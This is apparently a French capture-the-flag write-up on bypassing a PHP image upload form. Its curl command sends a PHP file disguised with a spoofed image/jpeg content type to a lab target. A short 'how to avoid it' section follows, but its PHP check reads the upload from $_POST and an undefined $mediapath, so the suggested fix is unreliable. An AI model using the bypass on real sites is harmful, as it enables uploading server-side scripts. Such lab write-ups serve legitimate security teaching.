# Explications
Dans la page "upload", il y un formulaire upload de fichier:
```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```
On peut donc essayer de faire passer un fichier <code>php</code> pour un <code>jpeg</code> via curl en requete POST avec la commande suivante:

<pre>curl -s -H "Content-Type: multipart/form-data" -F Upload=Upload -F "uploaded=@empty.php;type=image/jpeg"  "http://$IP/?page=upload" | grep "flag"</pre>
> On y rajoute le <code>grep flag</code> pour n'obtenir que le flag.

La commande va remplir tous les champs necessaires a l'upload et grâce au 
<code>type=image/jpeg</code> on peut faire croire au formulaire qu'il s'agit bien d'une image et non pas d'un script <code>php</code>.

# Comment l'éviter ?
Il suffit de faire un check du file upload dans le backend afin de verifier qu'aucun fichier corrompu ou autre ne soit mis sur le site, comme dans l'exemple suivant :

```php
//getimagesize ( string $filename [, array &$imageinfo ] ) : array
if (isset($_POST) && $_POST['Upload'] && $_POST['uploaded']) {
	if(@is_array(getimagesize($mediapath))){
		$image = true;
	} else {
		$image = false;
	}
}
```
<pre>
OUTPUT exemple:
Array (
[0] => 800
[1] => 450
[2] => 2
[3] => width="800" height="450"
[bits] => 8
[channels] => 3
[mime] => image/jpeg)
</pre>